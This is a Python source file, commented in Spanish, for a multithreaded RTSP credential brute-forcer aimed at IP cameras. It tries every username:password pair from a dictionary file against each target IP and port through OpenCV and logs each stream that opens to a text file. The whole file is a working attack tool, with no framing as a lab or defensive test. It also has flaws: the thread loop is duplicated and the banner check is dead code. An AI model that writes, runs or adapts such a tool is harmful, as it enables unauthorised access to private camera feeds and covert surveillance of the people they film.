import os
import cv2
import base64
import socket
import threading
import queue
import time
from common import cargar_datos, guardar_datos


class RtspBrute:
    def __init__(self, targets, dictionary_file, pause_duration=1, max_threads=50):
        self.targets = targets
        self.dictionary = self.load_dictionary(dictionary_file)
        self.pause_duration = pause_duration
        self.max_threads = max_threads if max_threads is not None else len(self.targets)
        self.q = queue.Queue()


    def load_dictionary(self, dictionary_file):
        with open(dictionary_file, 'r') as f:
            return [line.strip() for line in f.readlines()]

    def run(self):
        total_targets = len(self.targets)  # Obtener el número total de objetivos
        print(f"Total targets: {total_targets}")

        for target in self.targets:
##            print(f"Adding target: {target}")
            self.q.put(target)

        print(f"Using {self.max_threads} threads")
        threads = []
        while not self.q.empty():
            while len(threads) < self.max_threads and not self.q.empty():
                t = threading.Thread(target=self.brute_force)
                t.setDaemon(True)
                t.start()
                threads.append(t)

            for t in threads:
                t.join()
            threads.clear()

        print("Finished all threads")

        print(f"Using {self.max_threads} threads")
        threads = []
        while not self.q.empty():
            while len(threads) < self.max_threads and not self.q.empty():
                t = threading.Thread(target=self.brute_force)
                t.setDaemon(True)
                t.start()
                threads.append(t)

            for t in threads:
                t.join()
            threads.clear()

        print("Finished all threads")

    def rtsp_request(self, target, username="", password="", desired_fps=100):
        try:
            ip, port = target
            url = f"rtsp://{username}:{password}@{ip}:{port}/"
            # Verificar si la URL ya está en el archivo antes de intentar guardarla
            if self.is_url_already_saved(url):
                return
            os.environ["OPENCV_FFMPEG_CAPTURE_OPTIONS"] = "timeout;100"
            cap = cv2.VideoCapture(url, cv2.CAP_FFMPEG)
            # Establecer la tasa de FPS deseada
            cap.set(cv2.CAP_PROP_FPS, desired_fps)
            if cap.isOpened():
                print(f"Target: {url}")
                with open("RTSPCONECT.txt", "a") as file:
                    file.write(f"{url}\n")  # Guardar la dirección RTSP
                while True:
                    ret, frame = cap.read()
                    if not ret:
                        break
                    if cv2.waitKey(1) & 0xFF == ord('q'):
                        break
                cap.release()
                cv2.destroyAllWindows()
        except cv2.error as e:
            pass
            #print(f"Error en la conexión RTSP: {e}")

            
    def is_url_already_saved(self, url):
        with open("RTSPCONECT.txt", "r") as file:
            for line in file:
                if url.strip() == line.strip():
                    return True
        return False

    def brute_force(self):
        while not self.q.empty():
            target = self.q.get()
            ip, port = target
            try:
                datos_filtrados = cargar_datos()
            except Exception as e:
                print(f"Error loading data: {e}")
                continue
            
            for dato in datos_filtrados:
                if dato["IP"] == ip and dato["Puerto"] == port:
                    if dato["Banner"] and dato["Banner"] != "\u001b[31munknown\u001b[0m":
                        break
                    break

            for credential in self.dictionary:
                username, password = credential.split(':')
                self.rtsp_request(target, username, password)
                time.sleep(self.pause_duration)
